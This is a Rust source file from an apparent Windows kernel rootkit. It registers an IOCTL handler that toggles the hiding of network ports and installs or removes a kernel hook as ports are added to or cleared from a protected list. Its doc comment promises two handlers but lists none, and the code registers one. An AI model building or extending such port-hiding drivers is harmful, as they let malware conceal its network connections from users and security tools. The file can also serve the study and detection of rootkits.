use {
    alloc::boxed::Box, 
    hashbrown::HashMap,
    core::sync::atomic::Ordering,
    wdk_sys::{IO_STACK_LOCATION, IRP, NT_SUCCESS},
    shared::{ioctls::IOCTL_PORT, structs::PortInfo},
    crate::{handle, utils::ioctls::IoctlHandler, Port},
    super::{port::{add_remove_port_toggle, PROTECTED_PORTS}, HOOK_INSTALLED}, 
};

/// Registers the IOCTL handlers for port-related operations.
///
/// This function inserts two IOCTL handlers into the provided `HashMap`, associating them with
/// their respective IOCTL codes. The two operations supported are:
///
/// # Parameters
/// 
/// - `ioctls`: A mutable reference to a `HashMap<u32, IoctlHandler>` where the port-related
///   IOCTL handlers will be inserted.
///
pub fn get_port_ioctls(ioctls: &mut HashMap<u32, IoctlHandler>) {
    // Responsible for hide/unhide Port.
    ioctls.insert(IOCTL_PORT, Box::new(|irp: *mut IRP, stack: *mut IO_STACK_LOCATION | {
        let protected_ports = PROTECTED_PORTS.lock();

        if protected_ports.is_empty() && !HOOK_INSTALLED.load(Ordering::Relaxed) {
            unsafe { Port::install_hook() };
        }

        drop(protected_ports);

        let status = unsafe { handle!(stack, add_remove_port_toggle, PortInfo) }; 
        if NT_SUCCESS(status) {
            let protected_ports = PROTECTED_PORTS.lock();
            if protected_ports.is_empty() && HOOK_INSTALLED.load(Ordering::Relaxed) {
                unsafe { Port::uninstall_hook() };
            }
        }

        unsafe { (*irp).IoStatus.Information = 0 };
        
        status
    }) as IoctlHandler);
}